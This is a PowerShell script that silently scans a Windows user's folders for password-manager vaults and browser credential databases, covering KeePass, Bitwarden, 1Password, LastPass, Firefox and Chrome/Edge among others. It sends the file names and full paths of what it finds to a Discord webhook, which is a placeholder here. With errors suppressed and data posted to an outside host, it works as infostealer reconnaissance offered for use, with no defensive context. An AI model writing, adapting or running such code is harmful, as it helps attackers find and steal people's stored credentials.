# ================= VAULT SCANNER → DISCORD =================

$ErrorActionPreference = "SilentlyContinue"

# ===== CONFIG =====
$results = @()

$WebhookUrl = "WEBHOOK_URL_PLACEHOLDER"

$PasswordManagers = @(
    # KeePass / KeePassXC
    @{
        Manager  = "KeePass / KeePassXC"
        Scope    = $env:USERPROFILE
        Patterns = @("*.kdbx", "*.kdb")
    },

    # Bitwarden Desktop
    @{
        Manager  = "Bitwarden Desktop (Roaming)"
        Scope    = Join-Path $env:APPDATA 'Bitwarden'
        Patterns = @("data.json")
    },
    @{
        Manager  = "Bitwarden Desktop (Store)"
        Scope    = Join-Path $env:LOCALAPPDATA 'Packages\8bitSolutionsLLC.bitwardendesktop_h4e712dmw3xyy\LocalCache\Roaming\Bitwarden'
        Patterns = @("data.json")
    },

    # 1Password
    @{
        Manager  = "1Password"
        Scope    = "$env:USERPROFILE"
        Patterns = @("*.opvault", "*.1pux", "*.1pif")
    },

    # LastPass (legacy)
    @{
        Manager  = "LastPass (Legacy)"
        Scope    = Join-Path $env:APPDATA 'LastPass'
        Patterns = @("*.lpvault")
    },
    @{
        Manager  = "LastPass (Legacy)"
        Scope    = Join-Path $env:LOCALAPPDATA 'LastPass'
        Patterns = @("*.lpvault")
    },

    # Dashlane
    @{
        Manager  = "Dashlane"
        Scope    = Join-Path $env:APPDATA 'Dashlane'
        Patterns = @("*.dashlane", "*.db")
    },

    # Enpass
    @{
        Manager  = "Enpass"
        Scope    = "$env:USERPROFILE\Documents\Enpass"
        Patterns = @("*.enpassdb", "*.walletx")
    },
    @{
        Manager  = "Enpass"
        Scope    = Join-Path $env:LOCALAPPDATA 'Enpass'
        Patterns = @("*.enpassdb", "*.walletx")
    },

    # NordPass
    @{
        Manager  = "NordPass"
        Scope    = Join-Path $env:APPDATA 'NordPass'
        Patterns = @("*.nordpass")
    },

    # Keeper
    @{
        Manager  = "Keeper"
        Scope    = Join-Path $env:APPDATA 'Keeper'
        Patterns = @("*.keeper", "*.db")
    },

    # Firefox Lockwise
    @{
        Manager  = "Firefox (Lockwise)"
        Scope    = Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles'
        Patterns = @("logins.json", "key4.db")
    },

    # Chrome / Edge / WebView2
    @{
        Manager  = "Chrome/Edge Password DB"
        Scope    = $env:LOCALAPPDATA
        Patterns = @("Login Data")
    }
)

# ===== SCAN =====
foreach ($pm in $PasswordManagers) {
    if (-not (Test-Path $pm.Scope)) {
        continue
    }

    foreach ($pattern in $pm.Patterns) {
        try {
            $found = Get-ChildItem -Path $pm.Scope -Filter $pattern -File -Recurse -ErrorAction SilentlyContinue
            foreach ($item in $found) {
                $results += [PSCustomObject]@{
                    Manager       = $pm.Manager
                    FileName      = $item.Name
                    FullPath      = $item.FullName
                    SizeBytes     = $item.Length
                    LastWriteTime = $item.LastWriteTime
                }
            }
        } catch {
        }
    }
}

$results = $results | Sort-Object Manager, FullPath -Unique

# ===== SEND TO DISCORD =====
if ($results.Count -gt 0 -and $WebhookUrl -ne "") {

    $lines = $results | ForEach-Object {
        "$($_.Manager) | $($_.FileName) | $($_.FullPath)"
    }

    $text = $lines -join "`n"

    $maxLen = 1800

    for ($i = 0; $i -lt $text.Length; $i += $maxLen) {
        $len   = [Math]::Min($maxLen, $text.Length - $i)
        $chunk = $text.Substring($i, $len)

        $content = $chunk 

        $payload = @{
            username = "VaultScanner"
            content  = $content
        }

        try {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'
        } catch {
        }
    }
}
